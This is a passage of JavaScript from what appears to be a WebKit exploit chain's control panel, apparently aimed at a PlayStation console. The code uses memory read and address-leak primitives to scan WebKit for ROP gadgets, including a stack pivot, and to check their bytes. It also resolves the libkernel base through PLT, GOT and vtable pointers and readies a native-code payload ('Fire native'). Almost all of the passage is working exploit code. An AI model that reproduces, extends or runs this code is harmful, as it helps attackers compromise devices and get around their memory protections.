        const label = row[0];
        if (label === "MOV_RDI_RAX" || label === "G5") continue;
        if (!pivotRowFullExecOk(p, webkitBase, off, row)) {
            rowIdx = i;
            break;
        }
    }
    pivotFullScan = {
        base: String(webkitBase),
        rowIdx,
        cursor: null,
        bestHit: null,
        scanPhase: "expm1",
    };
    if (rowIdx < PIVOT_ROWS.length) {
        const lab = PIVOT_ROWS[rowIdx][0];
        const probe = pivotProbeHint(PIVOT_ROWS[rowIdx][1], off, off);
        mark("FULL-SCAN-START", "scanning " + lab
            + " full poops @ +0x" + (probe > 0 ? probe.toString(16) : "?")
            + " (expm1/G5 method, not low prefix)");
    }
}

/** Chunked full-pattern scan — 16-byte window, step 4 (finds 9-byte poops G0-G4). */
async function scanPivotFullRowPhase(p, webkitBase) {
    const off = loadEffectiveOff();
    if (!pivotFullScan || String(pivotFullScan.base) !== String(webkitBase))
        preparePivotFullScan(webkitBase, p);

    while (pivotFullScan.rowIdx < PIVOT_ROWS.length) {
        const skipRow = PIVOT_ROWS[pivotFullScan.rowIdx];
        const skipLab = skipRow[0];
        if (skipLab === "MOV_RDI_RAX" || skipLab === "G5") {
            pivotFullScan.rowIdx++;
            pivotFullScan.cursor = null;
            pivotFullScan.bestHit = null;
            continue;
        }
        if (!pivotRowFullExecOk(p, webkitBase, off, skipRow)) break;
        pivotFullScan.rowIdx++;
        pivotFullScan.cursor = null;
        pivotFullScan.bestHit = null;
    }

    if (pivotFullScan.rowIdx >= PIVOT_ROWS.length) {
        mark("FULL-SCAN-DONE", "all G0-G4 full poops gadgets found — Verify pivot");
        return "done";
    }

    const row = PIVOT_ROWS[pivotFullScan.rowIdx];
    const label = row[0];
    const key = row[1];
    const pat = pivotExecPattern(label, off);
    if (!pat) {
        pivotFullScan.rowIdx++;
        pivotFullScan.cursor = null;
        pivotFullScan.bestHit = null;
        return "continue";
    }

    const cap = scanCapOff();
    const tableHint = off[key] != null ? off[key] : pivotHint(key);
    const scanPhase = pivotFullScan.scanPhase || "expm1";
    let range;
    if (scanPhase === "low") {
        range = {
            minRva: SCAN_PIVOT_MIN,
            maxRva: Math.min(SCAN_LOW_MAX, cap),
            center: tableHint,
            phase: "low",
        };
        if (pivotFullScan._lowPhaseMark !== label) {
            pivotFullScan._lowPhaseMark = label;
            mark("FULL-SCAN-PHASE", label + " expm1 miss — low .text fallback");
        }
    } else {
        range = pivotFullScanRange(label, key, off, tableHint);
        range.phase = "expm1";
        if (pivotFullScan._expm1PhaseMark !== label) {
            pivotFullScan._expm1PhaseMark = label;
            mark("FULL-SCAN-PHASE", label + " expm1/G5 +0x"
                + range.minRva.toString(16) + "…+0x" + range.maxRva.toString(16));
        }
    }
    let rva = pivotFullScan.cursor != null
        ? pivotFullScan.cursor
        : (range.minRva & ~3);
    let steps = 0;
    const hint = range.center || tableHint;
    const chunkMax = SCAN_CHUNK_STEPS > 0 ? SCAN_CHUNK_STEPS : 2048;

    while (rva < range.maxRva && !scanPivotStop && steps < chunkMax) {
        if (fillWindow16(p, webkitBase, rva, _win16)) {
            const maxStart = 16 - pat.length;
            for (let start = 0; start <= maxStart; start++) {
                if (!matchPatAt(_win16, start, pat)) continue;
                const cand = rva + start;
                if (pivotFullScan.bestHit == null)
                    pivotFullScan.bestHit = { rva: cand };
                else if (hint > 0
                    && Math.abs(cand - hint) < Math.abs(pivotFullScan.bestHit.rva - hint))
                    pivotFullScan.bestHit = { rva: cand };
            }
        }
        rva += 4;
        steps++;
        if (SCAN_YIELD_EVERY > 0 && (steps & (SCAN_YIELD_EVERY - 1)) === 0)
            await new Promise(r => setTimeout(r, 0));
    }

    pivotFullScan.cursor = rva;
    scanState("full " + label + " @+0x" + rva.toString(16));

    if (scanPivotStop) return "stopped";
    if (rva < range.maxRva) return "continue";

    const hit = pivotFullScan.bestHit;
    pivotFullScan.cursor = null;
    pivotFullScan.bestHit = null;

    if (hit != null) {
        savePivotFullOverride(webkitBase, { [key]: hit.rva });
        mark("FULL-SCAN-HIT", label + " +0x" + hit.rva.toString(16)
            + (hint ? " prefix-was +0x" + hint.toString(16) : "")
            + " bytes=" + gadgetBytesHex(p, webkitBase, hit.rva, Math.max(pat.length, 12)));
        pivotFullScan.rowIdx++;
        pivotFullScan.scanPhase = "expm1";
        pivotFullScan._expm1PhaseMark = null;
        pivotFullScan._lowPhaseMark = null;
        return "continue";
    }

    if (scanPhase === "expm1") {
        mark("FULL-SCAN-MISS", label + " expm1/G5 cluster (0x"
            + range.minRva.toString(16) + "-0x" + range.maxRva.toString(16) + ")");
        pivotFullScan.scanPhase = "low";
        pivotFullScan.cursor = null;
        pivotFullScan.bestHit = null;
        return "continue";
    }

    mark("FULL-SCAN-MISS", label + " — no full poops gadget (expm1 + low .text)");
    pivotFullScan.rowIdx++;
    pivotFullScan.scanPhase = "expm1";
    pivotFullScan._expm1PhaseMark = null;
    pivotFullScan._lowPhaseMark = null;
    return "continue";
}

async function runPivotFullScanLoop() {
    const p = window.p;
    const off0 = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off0);
    if (!webkitBase) return;

    scanFullAuto = true;
    scanPivotStop = false;
    scanQuiet = true;
    busy = true;
    setUi();

    try {
        while (scanFullAuto && !scanPivotStop) {
            const st = await scanPivotFullRowPhase(p, webkitBase);
            if (st === "stopped") break;
            if (st === "done") break;
        }
        if (scanPivotStop)
            mark("FULL-SCAN-STOP", "cancelled");
        else
            verifyPivotManual(true);
    } catch (err) {
        mark("FULL-SCAN-FAIL", err.message || String(err));
        state("full scan error", "bad");
    } finally {
        scanQuiet = false;
        scanRenderPending = 0;
        scanFullAuto = false;
        scanPivotStop = false;
        busy = false;
        renderOut();
        setUi();
    }
}

async function runPivotFullScanAuto() {
    if (!ready || !window.p) return;
    if (scanFullAuto || scanPivotAuto) {
        scanPivotStop = true;
        mark("FULL-SCAN-STOP", "stopping after current chunk…");
        return;
    }

    const p = window.p;
    let off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("FULL-SCAN-SKIP", "no webkitBase — Save bases first");
        return;
    }

    preparePivotFullScan(webkitBase, p);
    let needs = pivotRowsNeedingFullExecScan(p, webkitBase, off);
    if (needs.length === 0) {
        mark("FULL-SCAN-SKIP", "all G0-G4 full gadgets verify — tap Verify pivot");
        verifyPivotManual();
        return;
    }

    mark("FULL-SCAN-AUTO", "G5-style: expm1 probe then near-cluster scan for "
        + needs.map(r => r[0]).join(", "));
    probePivotExpm1Hints(p, webkitBase, off);
    off = loadEffectiveOff();
    needs = pivotRowsNeedingFullExecScan(p, webkitBase, off);
    if (needs.length === 0) {
        mark("FULL-SCAN-SKIP", "expm1 probe found all — Verify pivot");
        verifyPivotManual();
        return;
    }

    state("full scan " + needs.map(r => r[0]).join(", ") + "…", "warn");
    mark("FULL-SCAN-AUTO", "chunked near expm1: " + needs.map(r => r[0]).join(", ")
        + " — " + SCAN_CHUNK_STEPS + " steps/tick — tap Stop to cancel");

    await runPivotFullScanLoop();
}

function verifyPivotManual(fromScan) {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    let off = loadEffectiveOff();
    const webkitBase = chainWebkitBase(off);
    if (!webkitBase) {
        mark("PIVOT-SKIP", "no webkitBase — Save bases first");
        return;
    }
    if (nativePrep && nativePrep.webkitBase
        && !same64(webkitBase, basesFromSession(off).webkitBase)) {
        mark("BASE-CHAIN", "verify wb=" + webkitBase + " (prep @ Start, not session)");
    }
    const g5rva = off.wk_PUSH_RDX_POP_RSP_RET;
    mark("PIVOT-CHECK", "G5="
        + (g5rva != null ? "+0x" + g5rva.toString(16) : "not set — HW +0x13ec77a")
        + " wb=" + webkitBase);
    const vFull = verifyFullChainSet(addr => read1p(p, addr), webkitBase, off);
    const v = verifyBisectChainSet(addr => read1p(p, addr), webkitBase, off);
    if (v.pivot.missing.length)
        mark("PIVOT-MISS", v.pivot.missing.join(", ") + " — tap a G5 button above");
    const prefixBad = v.pivot.bad.filter(b => !b.includes("("));
    const fullOnlyBad = vFull.pivot.bad.filter(b => b.includes("prefix-only"));
    if (prefixBad.length) {
        mark("PIVOT-BAD", prefixBad.join(", ") + " — prefix bytes mismatch at RVA");
        logPivotBadBytes(p, webkitBase, off, prefixBad);
        mark("PIVOT-HINT", "tap Scan full (auto) for chunked 9-byte poops rescan in low .text");
    }
    if (fullOnlyBad.length) {
        mark("PIVOT-FULL-BAD", fullOnlyBad.map(b => b.split(" ")[0]).join(", ")
            + " — prefix OK, poops tail differs (N5 may OOM)");
        logPivotBadBytes(p, webkitBase, off, fullOnlyBad);
        if (!fromScan) {
            mark("PIVOT-HINT", "tap Probe expm1 (G5 bar) or Scan full (auto)");
            probePivotExpm1Hints(p, webkitBase, off);
            off = loadEffectiveOff();
            const vAfter = verifyFullChainSet(addr => read1p(p, addr), webkitBase, off);
            if (vAfter.ok) {
                mark("PIVOT-FULL-READY", "expm1 probe fixed G0-G4 — Fire native / N5");
                pivotReady = verifyBisectChainSet(addr => read1p(p, addr), webkitBase, off).ok;
                state("chain OK (full) — Fire native or N5", "ok");
                setUi();
                return;
            }
        }
    }
    if (v.pivot.good.length)
        mark("PIVOT-PREFIX-OK", v.pivot.good.join(", "));
    if (vFull.pivot.good.length && !vFull.ok)
        mark("PIVOT-FULL-OK", vFull.pivot.good.join(", "));
    if (v.popBad.length) {
        mark("POP-BAD", v.popBad.join(", ") + " — needed for smoke chain @ wb=" + webkitBase);
        logPopBadBytes(p, webkitBase, off, v.popBad);
    } else if (v.popGood.length)
        mark("POP-OK", v.popGood.join(", ") + " (POP_RDI/RAX/LEAVE only — not POP_RCX)");
    if (v.popMissing.length)
        mark("POP-MISS", v.popMissing.join(", "));
    pivotReady = v.ok;
    if (v.ok) {
        mark("PIVOT-READY", v.pivot.count + "/" + v.pivot.total
            + " prefix pivot + " + v.popGood.length + " pop");
        if (vFull.ok)
            mark("PIVOT-FULL-READY", "all G0-G4 full poops bytes match — Fire native / N5 safe");
        else
            mark("PIVOT-FULL-WARN", "bisect unlocked on prefix — tap Scan full (auto) before Fire native / N5");
        state(vFull.ok ? "chain OK (full) — Fire native or N5" : "chain OK (prefix) — Scan full then N5", "ok");
    } else {
        state("chain not ready — " + pivotNotReadyMsg(v.pivot), "warn");
    }
    setUi();
}

function captureNativeFnQuick(p, off) {
    try {
        const raw = sessionStorage.getItem("wk-nativeFn");
        if (raw) {
            const fn = parseAddr(String(raw).replace(/^0x/i, ""));
            if (fn) return fn;
        }
    } catch (_) { }
    const cell = p.leakval(Math.expm1);
    return p.read8(p.read8(cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function || 0x28));
}

function resolveLibkernelBase(p, off, webkitBase) {
    const r = resolveLibkernel(p, webkitBase, off, {
        log: mark,
        read8: read8p,
    });
    return r.ok ? r.lk : null;
}

let iatScanState = null;

function logLibkernelMissSummary(chunk, scanStateObj, webkitBase, nativeFn) {
    const st = scanStateObj || {};
    const ps = st.pltStats || {};
    const path = st.poopsLite ? "lite" : "full";
    const ff25 = chunk.ff25 != null ? chunk.ff25 : (ps.ff25 || 0);
    const gotHigh = chunk.gotHigh != null ? chunk.gotHigh : (ps.gotHigh || 0);
    const e8ext = chunk.e8ext != null ? chunk.e8ext : (ps.e8ext || 0);
    const ring = chunk.nearPages != null ? chunk.nearPages : (st.nearPages || 0);
    const leak = chunk.leakTried != null ? chunk.leakTried : (st.leakTried || 0);
    mark("LK-SUMMARY", "build=" + BUILD_ID + " path=" + path + " phase=" + (chunk.phase || "?")
        + " wk=" + webkitBase
        + " ff25=" + ff25 + " gotHigh=" + gotHigh + " e8ext=" + e8ext
        + " near=" + ring + " leak=" + leak
        + (chunk.dynTried != null ? " dyn=" + chunk.dynTried : "")
        + (chunk.refs ? " plt=" + chunk.refs : "")
        + (chunk.slots ? " got=" + chunk.slots : "")
        + (chunk.probes ? " stub=" + chunk.probes : ""));
    const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
    for (let ci = 0; ci < Math.min(cands.length, 6); ci++)
        mark("LK-GUESS", cands[ci].hex + " (" + cands[ci].why + ")");
    mark("LK-HINT", "Leak+vtable LK on rw — or cal 2e for EXT-PTR lines");
    if (stateEl) {
        stateEl.textContent = "libkernel miss — open cal, paste vtable ext ptr";
        stateEl.className = "bad";
    }
}

async function runShowLkHints() {
    if (!ready || busy) return;
    const { nativeFn, webkitBase } = basesFromSession(loadEffectiveOff());
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Save bases first");
        return;
    }
    showLibkernelGuesses(webkitBase, nativeFn, mark);
    mark("LK-HINT", "hints are NOT probed (OOM) — use Leak scan LK or cal paste");
    renderOut();
}

let leakScanState = null;
let calLkHits = [];
let calLkHitIdx = 0;
let calcFnExtIdx = 0;
let calcFnHitIdx = 0;
let calcFnLastHex = "";

/** Calc fn from hex box or 2e ext ptrs — fn→lk→stub, 0 reads (then Accept fn). */
function runCalcFn() {
    if (busy) {
        mark("LK-FN-SKIP", "busy — wait");
        renderOut();
        return;
    }
    const off = lkCalcOff();
    let hex = addrIn && addrIn.value ? addrIn.value.trim().replace(/^0x/i, "") : "";
    let pickLabel = null;

    if (!hex) {
        const cands = calExtPtrCandidates();
        if (!cands.length) {
            mark("LK-FN-SKIP", "paste k_usleep fn ptr — or run 2e Leak+lk first");
            mark("LK-HINT", "2e fills LK-EXT-CAND → Calc fn cycles them (0 reads)");
            state("paste fn or 2e first", "bad");
            renderOut();
            return;
        }
        const idx = calcFnExtIdx % cands.length;
        const c = cands[idx];
        pickLabel = c.label;
        hex = String(c.ptr).replace(/^0x/i, "");
        calcFnExtIdx = (calcFnExtIdx + 1) % cands.length;
        mark("LK-FN-PICK", (idx + 1) + "/" + cands.length
            + " " + c.label + " " + hex);
    }

    const ptr = parseAddr(hex);
    if (!ptr) {
        mark("LK-FN-SKIP", "bad hex");
        state("bad hex", "bad");
        renderOut();
        return;
    }

    const asBase = verifyLibkernelZeroRead(ptr, off, { via: "calc-fn-base" });
    if (asBase.ok) {
        mark("LK-FN-SKIP", hex + " is 16KB lk base — paste k_usleep fn ptr");
        mark("LK-HINT", "Calc fn wants fn ptr; use Accept lk for base");
        state("need fn ptr not lk base", "warn");
        renderOut();
        return;
    }

    const hits = calcLkFromFnPtrZeroRead(ptr, off);
    if (!hits.length) {
        mark("LK-FN-CAL-MISS", hex + " — no Suchi RVA match");
        mark("LK-HINT", "want k_usleep from 2e LK-EXT-CAND / LK-PTR-OK");
        state("calc fn miss", "bad");
        renderOut();
        return;
    }

    if (hex !== calcFnLastHex) {
        calcFnHitIdx = 0;
        calcFnLastHex = hex;
    }
    const h = hits[calcFnHitIdx % hits.length];
    calcFnHitIdx++;
    const stubAddr = getpidStubFromFn(ptr, off);
    const delta = (off.k_usleep != null && off.k_stubs && off.k_stubs[20] != null)
        ? ((off.k_stubs[20] - off.k_usleep) >>> 0) : null;

    if (addrIn) addrIn.value = hex;
    mark("LK-FN-CAL", "build=" + BUILD_ID
        + (pickLabel ? " " + pickLabel : "")
        + " fn=" + hex + " → lk=" + h.lk + " (" + h.via + " −0x" + h.rva.toString(16) + ")"
        + (stubAddr ? " stub=" + stubAddr
            + (delta != null ? " (+0x" + delta.toString(16) + ")" : "") : "")
        + " [" + calcFnHitIdx + "/" + hits.length + " alt]");
    for (let i = 0; i < hits.length && i < 4; i++) {
        const alt = hits[i];
        if (String(alt.lk) === String(h.lk) && alt.via === h.via) continue;
        mark("LK-FN-ALT", "lk=" + alt.lk + " via " + alt.via + " −0x" + alt.rva.toString(16));
    }
    mark("LK-HINT", "Accept fn (0 reads) — Calc fn again cycles alts / next 2e ptr");
    state("fn calc OK — Accept fn", "ok");
    renderOut();
    try {
        crashLog.append("CAL-FN " + hex + " lk=" + h.lk
            + (stubAddr ? " stub=" + stubAddr : ""), "LK-FN-CAL");
        crashLog.flushSync();
    } catch (_) { }
}

/** Calc lk from hex box — lk base or fn ptr − Suchi RVA. No cal session needed. */
function calcLkFromHex() {
    const off = loadEffectiveOff();
    let hex = addrIn && addrIn.value ? addrIn.value.trim().replace(/^0x/i, "") : "";
    if (!hex) {
        mark("LK-SKIP", "paste libkernel base (16KB …000) or fn ptr in hex box");
        state("paste hex first", "bad");
        renderOut();
        return;
    }
    const ptr = parseAddr(hex);
    if (!ptr) {
        mark("LK-SKIP", "bad hex");
        state("bad hex", "bad");
        renderOut();
        return;
    }
    const asBase = verifyLibkernelZeroRead(ptr, off, { via: "calc-base" });
    if (asBase.ok) {
        if (addrIn) addrIn.value = String(ptr);
        mark("LK-CAL", "already lk base " + ptr + " (16KB) — tap Accept lk");
        state("base OK — Accept lk", "ok");
        renderOut();
        return;
    }
    const hits = calcLkFromFnPtrZeroRead(ptr, off);
    if (!hits.length) {
        mark("LK-CAL-MISS", hex + " — not 16KB lk base and no Suchi RVA match");
        mark("LK-HINT", "paste fn ptr from cal LK-PTR lines, or 16KB base like 80a67c000");
        state("calc miss", "bad");
        renderOut();
        return;
    }
    if (calLkHits.length !== hits.length || String(calLkHits[0] && calLkHits[0].lk) !== String(hits[0].lk))
        calLkHitIdx = 0;
    calLkHits = hits;
    const h = hits[calLkHitIdx % hits.length];
    calLkHitIdx++;
    if (addrIn) addrIn.value = String(h.lk);
    mark("LK-CAL", calLkHitIdx + "/" + hits.length + " fn−" + h.key
        + "+0x" + h.rva.toString(16) + " → " + h.lk + " (0 read)");
    mark("LK-HINT", "Accept lk → reload → Start");
    state("calc OK — Accept lk", "ok");
    renderOut();
    try {
        crashLog.append("LK-CAL " + h.lk + " fn−" + h.key, "LK-CAL");
        crashLog.flushSync();
    } catch (_) { }
}

function runTryCalPtrs() {
    runVtable2eLk().catch(reportErr);
}

function runOneReadLk() {
    if (!window.p || !ready) {
        mark("LK-SKIP", "Start first (need webkitBase from this WebKit process)");
        state("Start first", "bad");
        renderOut();
        return;
    }
    const p = window.p;
    const off = loadEffectiveOff();
    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
    if (!webkitBase && nativePrep && nativePrep.webkitBase)
        webkitBase = nativePrep.webkitBase;
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase in session");
        renderOut();
        return;
    }
    try {
        const r = resolveLkOnePltStep(p, webkitBase, off);
        if (r.ok) {
            saveLibkernelSession(r.lk, r.pltRva, { forced: true });
            if (addrIn) addrIn.value = String(r.lk);
            mark("LK-OK", "WebKit 1-read plt+0x" + r.pltRva.toString(16)
                + " → " + r.lk + " (" + r.via + ")");
            mark("LK-HINT", "reload → native mode usleep → Start");
            state("WebKit lk OK — reload + Start", "ok");
            crashLog.append("LK-1READ " + r.lk + " plt=" + r.pltRva.toString(16), "LK-OK");
            crashLog.flushSync();
        } else {
            mark("LK-MISS", (r.idx + 1) + "/" + r.total + " plt+0x"
                + (r.pltRva != null ? r.pltRva.toString(16) : "?")
                + " — " + (r.error || "?"));
            mark("LK-HINT", "tap 1-read lk again (one PLT per tap, not a scan)");
            state("miss — tap 1-read lk again", "warn");
        }
    } catch (err) {
        mark("LK-FAIL", err.message || String(err));
        state("1-read error", "bad");
    }
    renderOut();
}

function acceptFnFromHex(hexOverride) {
    const off = lkCalcOff();
    let hex = hexOverride != null ? String(hexOverride).trim().replace(/^0x/i, "") : "";
    if (!hex && addrIn && addrIn.value)
        hex = addrIn.value.trim().replace(/^0x/i, "");
    if (!hex) {
        mark("LK-FN-SKIP", "paste k_usleep fn ptr from 2e / LK-EXT-CAND");
        state("paste fn ptr", "bad");
        renderOut();
        return false;
    }
    const ptr = parseAddr(hex);
    if (!ptr) {
        mark("LK-FN-SKIP", "bad hex");
        state("bad hex", "bad");
        renderOut();
        return false;
    }
    const hits = calcLkFromFnPtrZeroRead(ptr, off);
    if (!hits.length) {
        mark("LK-FN-MISS", hex + " — not a known libkernel fn (want k_usleep from cal 2e)");
        mark("LK-HINT", "use Accept fn for fn ptr — Accept lk is 16KB base only");
        state("fn accept failed", "bad");
        renderOut();
        return false;
    }
    const h = hits[0];
    saveLastFnPtr(ptr);
    saveLibkernelSession(h.lk, null, { forced: true });
    if (addrIn) addrIn.value = hex;
    const stubAddr = getpidStubFromFn(ptr, off);
    mark("LK-FN-OK", "fn=" + hex + " → lk=" + h.lk + " (" + h.via + ")"
        + (stubAddr ? " stub=" + stubAddr + " (0 reads)" : ""));
    state("fn accepted (0 reads)", "ok");
    renderOut();
    try {
        crashLog.append("ACCEPT-FN " + hex + " lk=" + h.lk, "LK-FN-OK");
        crashLog.flushSync();
    } catch (_) { }
    return true;
}

function acceptLkFromHex(hexOverride) {
    const off = lkCalcOff();
    let hex = hexOverride != null ? String(hexOverride).trim().replace(/^0x/i, "") : "";
    if (!hex && addrIn && addrIn.value)
        hex = addrIn.value.trim().replace(/^0x/i, "");
    if (!hex) {
        mark("LK-SKIP", "paste 16KB lk base (…000) — fn ptr uses Accept fn");
        state("paste lk base in hex box", "bad");
        renderOut();
        return false;
    }
    const ptr = parseAddr(hex);
    if (!ptr) {
        mark("LK-SKIP", "bad hex");
        state("bad hex", "bad");
        renderOut();
        return false;
    }

    if (calcLkFromFnPtrZeroRead(ptr, off).length) {
        mark("LK-HINT", hex + " is fn ptr — accepting via fn path (0 reads)");
        return acceptFnFromHex(hex);
    }

    const asBase = verifyLibkernelZeroRead(ptr, off, { via: "manual-base" });
    if (asBase.ok) {
        saveLastFnPtr(null);
        saveLibkernelSession(ptr, null, { forced: true });
        if (addrIn) addrIn.value = String(ptr);
        mark("LK-OK", String(ptr) + " lk base accepted (0 reads)");
        state("lk accepted", "ok");
        renderOut();
        try {
            crashLog.append("ACCEPT OK okage " + hex, "LK-VERIFY");
            crashLog.flushSync();
        } catch (_) { }
        return true;
    }

    mark("LK-VERIFY-MISS", hex + " — " + (asBase.error || "?"));
    mark("LK-HINT", "lk must be 16KB …000 — or paste k_usleep fn → Accept fn");
    state("accept failed", "bad");
    renderOut();
    try { crashLog.append("ACCEPT FAIL " + hex, "LK-VERIFY"); crashLog.flushSync(); } catch (_) { }
    return false;
}

function runVerifyLk() {
    if (findLkAuto) {
        mark("LK-SKIP", "Scan GOT still running — Stop find first");
        renderOut();
        return;
    }
    mark("LK-VERIFY", "0-read accept build=" + BUILD_ID);
    acceptLkFromHex(null);
}

let extResolveIdx = 0;
let verifyPassIdx = 0;

function loadExtPtrAt(idx) {
    try {
        const raw = sessionStorage.getItem(SS_CAL_EXT_PTRS);
        if (!raw) return null;
        const arr = JSON.parse(raw);
        if (!Array.isArray(arr) || !arr.length) return null;
        extResolveIdx = ((idx % arr.length) + arr.length) % arr.length;
        return arr[extResolveIdx].ptr.replace(/^0x/i, "");
    } catch (_) {
        return null;
    }
}

function cycleExtPtrInHex() {
    const n = loadExtPtrAt(extResolveIdx + 1);
    if (n && addrIn) {
        addrIn.value = n;
        mark("LK-EXT-NEXT", (extResolveIdx + 1) + " → " + n);
    }
    return n;
}

function extPtrHex(entry) {
    if (!entry) return "";
    const raw = entry.ptr != null ? entry.ptr : entry;
    return String(raw).replace(/^0x/i, "").trim();
}

function saveExtPtrsSession(extList) {
    if (!extList || !extList.length) return;
    try {
        const arr = [];
        for (let i = 0; i < extList.length && i < 16; i++) {
            const hex = extPtrHex(extList[i]);
            if (!hex) continue;
            arr.push({
                label: extList[i].vt || ("vt[" + (extList[i].idx != null ? extList[i].idx : i) + "]"),
                ptr: hex,
            });
        }
        if (arr.length)
            sessionStorage.setItem(SS_CAL_EXT_PTRS, JSON.stringify(arr));
    } catch (_) { }
}

function finishFindLkChunk(chunk) {
    if (chunk.ok && chunk.lk) {
        findLkState = null;
        findLkAuto = false;
        findLkStop = false;
        if (addrIn) addrIn.value = String(chunk.lk);
        mark("LK-GOT-OK", (chunk.source || chunk.phase) + " → " + chunk.lk
            + " build=" + BUILD_ID);
        state("Scan GOT OK — Accept lk → Arm → Fire", "ok");
        crashLog.append("LK-GOT-OK " + chunk.lk, "LK-GOT");
        crashLog.flushSync();
        return true;
    }
    const isMiss = chunk.done && (
        chunk.phase === "got-scan-miss" || chunk.phase === "vt-miss");
    if (!isMiss) return false;

    findLkState = null;
    findLkAuto = false;
    findLkStop = false;

    const ext = Array.isArray(chunk.extList) ? chunk.extList : [];
    const extN = chunk.vtExt != null ? chunk.vtExt : ext.length;
    try {
        mark("LK-TRACE", "known=" + (chunk.known != null ? chunk.known : 0)
            + " cells=" + (chunk.cells != null ? chunk.cells : 0)
            + " vtables=" + (chunk.vtCount != null ? chunk.vtCount : 0)
            + " ext=" + extN
            + (chunk.tried != null ? " tried=" + chunk.tried : "")
            + (chunk.vtable ? " vtab=" + String(chunk.vtable).slice(0, 20) : ""));
        renderOut();
        crashLog.flushSync();

        if (chunk.cellDbg && chunk.cellDbg.length)
            mark("LK-CELL-DBG", String(chunk.cellDbg.join(" | ").slice(0, 240)));

        if (ext.length) {
            saveExtPtrsSession(ext);
            extResolveIdx = 0;
            mark("LK-EXT", "n=" + ext.length + " saved — auto-resolving…");
            renderOut();
            crashLog.flushSync();

            const merged = mergeExtEntries([
                ext.map(function (e) {
                    return {
                        label: e.vt || e.source || "vt",
                        hex: extPtrHex(e),
                        ptr: extPtrHex(e),
                    };
                }),
                calExtPtrCandidates(),
            ]);
            const p = window.p;
            const off = loadEffectiveOff();
            const wb = basesFromSession(off).webkitBase;
            if (p && wb && merged.length) {
                const hit = resolveLibkernelFromExtList(p, wb, off, merged, {
                    minVotes: 1,
                    minDistinctFn: 2,
                    allowSinglePriRva: true,
                });
                if (hit.ok && hit.lk) {
                    saveLibkernelSession(hit.lk, hit.iatRva || null);
                    if (addrIn) addrIn.value = String(hit.lk);
                    mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ") reads=0");
                    state("Scan GOT → ext auto OK (0-read)", "ok");
                    renderOut();
                    crashLog.append("LK-GOT-EXT " + hit.lk, "LK-OK");
                    crashLog.flushSync();
                    return true;
                }
                if (hit.zeroRank && hit.zeroRank.length)
                    logExtScanRank("LK-ZERO-RANK", hit.zeroRank);
                if (hit.ptrDiag)
                    logExtPtrDiag(hit.ptrDiag);
                if (hit.hint)
                    mark("LK-HINT", hit.hint);
                mark("LK-EXT-MISS", hit.error || "auto-resolve failed");
            }
            mark("LK-HINT", "tap Scan ext→lk or re-run cal 2e");
            mark("LK-MISS", "ext collected build=" + BUILD_ID);
        } else if (chunk.cells === 0) {
            mark("LK-HINT", "no cells — re-run Start");
        } else if ((chunk.vtCount || 0) === 0) {
            mark("LK-HINT", "no vtable — check LK-CELL-DBG");
        } else {
            mark("LK-HINT", "no ext ptrs in vtable slots");
            mark("LK-MISS", (chunk.error || chunk.phase || "miss") + " build=" + BUILD_ID);
        }
    } catch (err) {
        mark("LK-FINISH-ERR", err.message || String(err));
    }

    state("Scan GOT miss — see LK-TRACE", "bad");
    renderOut();
    crashLog.flushSync();
    return true;
}

function stopFindLk() {
    findLkStop = true;
    huntLkAuto = false;
    psfreeAutoStop = true;
    state("Find lk stopping…", "warn");
}

/** ELF hdr → dynamic GOT → RELRO slots → textarea vtable (no PLT, no cal ptr). */
async function runFindLkAuto(preset) {
    if (!ready || !window.p) return;
    if (findLkAuto) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { nativeFn, webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("LK-SKIP", "no webkitBase — Start first");
        return;
    }

    findLkPreset = preset || FIND_LK_LITE;
    findLkState = null;
    findLkAuto = true;
    findLkStop = false;
    busy = true;
    setUi();
    mark("LK-GOT", "auto " + findLkPreset.label + " build=" + BUILD_ID);
    renderOut();

    const opts = Object.assign({
        nativeFn,
        retain: retained,
        carrier: window._wkCarrier || null,
        pairCells: pairCellsForLk(),
        skipKnown: false,
        knownExtPtrs: knownExtPtrsForLk(),
    }, findLkPreset);
    let loops = 0;
    const loopMax = 120;

    try {
        while (findLkAuto && !findLkStop && loops < loopMax) {
            const chunk = resolveLibkernelRelroChunk(p, webkitBase, off, findLkState, opts);
            findLkState = chunk.state;
            if (chunk.phase === "got-scan-start")
                mark("LK-GOT", "lite=safe-only known+vtable (no blind scan) build=" + BUILD_ID);
            else if (chunk.phase === "known-start")
                mark("LK-GOT", "known ext ptrs n=" + chunk.n);
            else if (chunk.phase === "known-skip" || chunk.phase === "known-done")
                mark("LK-GOT", (chunk.phase === "known-skip" ? "known skipped (OOM-safe)" : "known miss tried=" + (chunk.tried || 0))
                    + " — vtable scan");
            else if (chunk.phase === "vt-ready")
                mark("LK-GOT", "vtable " + chunk.vtable
                    + " n=" + (chunk.vtCount || 1) + " cells=" + (chunk.cells || "?")
                    + " " + (chunk.label || "")
                    + " — collect ext only"
                    + (chunk.cellDbg && chunk.cellDbg.length
                        ? " dbg=" + chunk.cellDbg.join(" | ").slice(0, 80) : ""));
            else if (chunk.phase === "vt-miss" && chunk.cellDbg && chunk.cellDbg.length)
                mark("LK-CELL-DBG", chunk.cellDbg.join(" | ").slice(0, 240));
            else if (chunk.phase === "vt-done")
                mark("LK-GOT", "vtable ext=" + (chunk.ext || 0) + " — use Verify lk");
            else if (chunk.phase === "abs-start")
                mark("LK-GOT", "abs RELRO " + chunk.from + "…" + chunk.to);
            else if (chunk.phase === "abs-done")
                mark("LK-GOT", "abs miss tried=" + (chunk.tried || 0)
                    + " — nearlk ±" + (findLkPreset.nearRadius || 0).toString(16));
            else if (chunk.phase === "nearlk-start")
                mark("LK-GOT", "nearlk hunt libkernel.sprx");
            else if (chunk.phase === "nearlk-done")
                mark("LK-GOT", "nearlk miss pages=" + (chunk.pages || 0)
                    + " magic=" + (chunk.hits || 0) + " — below-webkit");
            else if (chunk.phase === "below-done")
                mark("LK-GOT", "below miss pages=" + (chunk.pages || 0) + " — ELF hdr");
            else if (chunk.phase === "hdr-ok")
